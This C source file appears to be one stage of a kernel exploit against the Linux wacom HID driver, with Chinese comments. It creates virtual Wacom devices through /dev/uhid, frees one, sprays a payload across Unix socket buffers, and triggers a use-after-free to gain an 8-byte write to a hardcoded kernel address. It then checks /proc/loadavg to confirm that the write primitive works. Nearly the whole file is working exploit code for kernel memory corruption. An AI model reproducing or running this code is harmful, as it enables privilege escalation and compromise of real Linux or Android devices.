/*
 * phase_b3: 99491 写原语 oracle 验证 —— 修正判据
 *
 * phase_b2 的判据 bug:
 *   用字符串比较 "22.98" != "22.94" 判定"写入成功"，但那是 loadavg 的
 *   5 秒自然更新。guard 模式（0x598=0xFF，绝不写）也被判成 PASS，是假阳性。
 *
 * 正确判据（avenrun FSHIFT=11，即 value/2048）:
 *   写入 8 字节 = (value<<32) | 0x00000003
 *     value=0  -> avenrun[2]=3      -> loadavg15 = 0.00
 *     value>0  -> avenrun[2]>=2^32  -> loadavg15 >= 2097152.00
 *   自然波动幅度 < 1.0，绝不可能跨到 0.00（稳定）或 >1000。
 *
 *   因此:
 *     PASS  : new > 1000  或  (new == 0.00 且连续 3 次都 0)
 *     NOISE : |new - base| < 1.0
 *     WEAK  : 其他（需要人工看）
 *
 * 用法: phase_b3 <cpu> <pairs> <payload_file>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/uhid.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "phasetest/33"
#define ORACLE_ADDR 0xffffffde9770e5a0ULL   /* avenrun[2] */

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static int uhid_create(int fd, const char *name, const char *phys, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", phys);
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0100;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.rd_size = rl;
    memcpy(ev.u.create2.rd_data, rd, rl);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_input(int fd, const unsigned char *data, size_t len) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_INPUT2;
    ev.u.input2.size = len;
    memcpy(ev.u.input2.data, data, len);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static void pump(int fd, long ms) {
    long dl = now_us() / 1000 + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_us() / 1000 < dl) {
        if (read(fd, &ev, sizeof(ev)) <= 0) usleep(400);
    }
    fcntl(fd, F_SETFL, fc);
}

/* 返回 loadavg15 数值；失败返回 -1 */
static double read_av15(void) {
    FILE *f = fopen("/proc/loadavg", "r");
    if (!f) return -1.0;
    char l1[32] = {0}, l5[32] = {0}, l15[32] = {0};
    int got = fscanf(f, "%31s %31s %31s", l1, l5, l15);
    fclose(f);
    if (got != 3) return -1.0;
    return atof(l15);
}

int main(int argc, char **argv) {
    int cpu   = argc > 1 ? atoi(argv[1]) : 0;
    int pairs = argc > 2 ? atoi(argv[2]) : 400;
    const char *pfile = argc > 3 ? argv[3] : "/data/local/tmp/payload_av.bin";

    FILE *pf = fopen(pfile, "rb");
    if (!pf) { perror("payload"); return 2; }
    static unsigned char pl[4096];
    size_t pl_len = fread(pl, 1, sizeof(pl), pf);
    fclose(pf);

    unsigned long long ev0  = *(unsigned long long *)(pl + 0x028);
    unsigned long long abs0 = *(unsigned long long *)(pl + 0x098);
    unsigned long long p140 = *(unsigned long long *)(pl + 0x140);
    unsigned long long p148 = *(unsigned long long *)(pl + 0x148);
    unsigned int numv = *(unsigned int *)(pl + 0x568);
    unsigned int maxv = *(unsigned int *)(pl + 0x56c);
    unsigned long long vals = *(unsigned long long *)(pl + 0x570);
    unsigned char guard = pl[0x598];

    int will_write = (!guard && vals != 0 && (ev0 >> 3 & 1) && (abs0 & 1)
                      && p140 == 0 && p148 == 0);

    printf("=== phase_b3 (ONE SHOT, strict oracle) ===\n");
    printf("pid=%d cpu=%d pairs=%d\n", getpid(), cpu, pairs);
    printf("payload=%s len=%zu\n", pfile, pl_len);
    printf("  0x028 evbit[0] = 0x%llx  bit3=%d %s\n", ev0,
           (int)((ev0 >> 3) & 1), ((ev0 >> 3) & 1) ? "OK" : "!! 不触发");
    printf("  0x098 absbit[0]= 0x%llx  bit0=%d %s\n", abs0,
           (int)(abs0 & 1), (abs0 & 1) ? "OK" : "!! 跳过写入");
    printf("  0x140 ptr      = 0x%llx %s\n", p140, p140 ? "!! 非0" : "OK");
    printf("  0x148 absinfo  = 0x%llx %s\n", p148, p148 ? "!! 非0" : "OK");
    printf("  0x568 num_vals = %u\n", numv);
    printf("  0x56c max_vals = %u\n", maxv);
    printf("  0x598 guard    = 0x%02x %s\n", guard, guard ? "(立即返回)" : "(会继续)");
    printf("  vals           = 0x%016llx\n", vals);
    printf("  >>> 本配置是否应当发生写入: %s\n", will_write ? "YES" : "NO");
    fflush(stdout);

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        printf("pin fail: %s\n", strerror(errno));
        return 3;
    }
    printf("pinned cpu=%d running=%d\n", cpu, sched_getcpu());

    double b[3];
    for (int i = 0; i < 3; i++) {
        b[i] = read_av15();
        usleep(20000);
    }
    printf("BASELINE loadavg15 = %.2f / %.2f / %.2f\n", b[0], b[1], b[2]);
    fflush(stdout);

    int (*sp)[2] = calloc(pairs, sizeof(int[2]));
    int made = 0;
    for (int i = 0; i < pairs; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp[i]) < 0) continue;
        int sb = 8 << 20;
        setsockopt(sp[i][0], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
        setsockopt(sp[i][1], SOL_SOCKET, SO_RCVBUF, &sb, sizeof(sb));
        made++;
    }
    printf("socketpairs=%d\n", made);

    int fdt = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    int fdp = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fdt < 0 || fdp < 0) { printf("uhid open fail: %s\n", strerror(errno)); return 4; }

    if (uhid_create(fdt, "pb3-touch", PHYS_COMMON, 0x1101,
                    rdesc_touch, sizeof(rdesc_touch)) < 0) { printf("ct fail\n"); return 5; }
    pump(fdt, 100);
    if (uhid_create(fdp, "pb3-pad", PHYS_COMMON, 0x1102,
                    rdesc_pad, sizeof(rdesc_pad)) < 0) { printf("cp fail\n"); return 5; }
    pump(fdp, 100);
    usleep(300000);
    pump(fdt, 30); pump(fdp, 30);
    printf("both devices created, wacom bound\n");
    fflush(stdout);

    long t1 = now_us();
    uhid_destroy(fdt);
    close(fdt);
    fdt = -1;

    int sent = 0;
    for (int i = 0; i < made; i++) {
        if (send(sp[i][0], pl, pl_len, MSG_DONTWAIT) >= 0) sent++;
    }
    long t2 = now_us();
    printf("destroy+spray: %d msgs in %ldus\n", sent, t2 - t1);

    double pre = read_av15();
    printf("PRE-MUTE loadavg15 = %.2f\n", pre);
    fflush(stdout);

    printf(">>> firing MUTE (once)\n");
    fflush(stdout);
    long t3 = now_us();
    unsigned char rep[2] = { 0x02, 0x02 };
    uhid_input(fdp, rep, sizeof(rep));
    pump(fdp, 50);
    long t4 = now_us();
    printf("<<< MUTE returned in %ldus (no panic)\n", t4 - t3);
    fflush(stdout);

    double a[5];
    for (int i = 0; i < 5; i++) {
        a[i] = read_av15();
        if (i < 4) usleep(250000);
    }
    printf("POST-MUTE loadavg15 = %.2f %.2f %.2f %.2f %.2f\n",
           a[0], a[1], a[2], a[3], a[4]);
    fflush(stdout);

    /* ★ 严格判据 */
    int zero_cnt = 0, huge_cnt = 0;
    for (int i = 0; i < 5; i++) {
        if (a[i] >= 0.0 && a[i] < 0.005) zero_cnt++;
        if (a[i] > 1000.0) huge_cnt++;
    }
    double delta = a[0] - pre;
    if (delta < 0) delta = -delta;

    printf("\n========================================\n");
    printf("严格判据: pre=%.2f post0=%.2f |Δ|=%.2f\n", pre, a[0], delta);
    printf("  zero_cnt(≈0.00)=%d  huge_cnt(>1000)=%d\n", zero_cnt, huge_cnt);
    printf("----------------------------------------\n");

    if (!will_write) {
        /* 本配置不该写，用来验证"不该写时确实没写" */
        if (huge_cnt == 0 && zero_cnt == 0 && delta < 1.0) {
            printf("VERDICT: NEGATIVE CONTROL OK\n");
            printf("  本配置不应写入，oracle 也确实没变（仅 %.2f 自然波动）\n", delta);
        } else {
            printf("VERDICT: CONTROL ANOMALY\n");
            printf("  本配置不该写，但 oracle 出现异常变化，需排查\n");
        }
    } else {
        if (huge_cnt > 0 || zero_cnt >= 3) {
            printf("VERDICT: WRITE CONFIRMED (PASS)\n");
            printf("  oracle 出现位模式级突变: %.2f -> %.2f\n", pre, a[0]);
            printf("  这是 8 字节写入 avenrun[2] 的特征\n");
        } else if (delta < 1.0) {
            printf("VERDICT: NO WRITE (配置应写但未观测到)\n");
            printf("  Δ=%.2f 属自然波动。可能原因:\n", delta);
            printf("   1) payload 未占住槽位（0x598/vals 读到别人的值）\n");
            printf("   2) MUTE 未走 EV_ABS code=0 路径\n");
            printf("   3) wacom_wac->input 已重生，UAF 未命中\n");
        } else {
            printf("VERDICT: WEAK SIGNAL (需人工判断)\n");
            printf("  Δ=%.2f 超出自然波动但未达位模式突变\n", delta);
        }
    }
    printf("========================================\n");
    fflush(stdout);

    char tmp[4096];
    for (int i = 0; i < made; i++)
        while (recv(sp[i][1], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) ;
    if (fdp >= 0) { uhid_destroy(fdp); close(fdp); }

    printf("=== phase_b3 done, SURVIVED, pid=%d ===\n", getpid());
    fflush(stdout);
    return 0;
}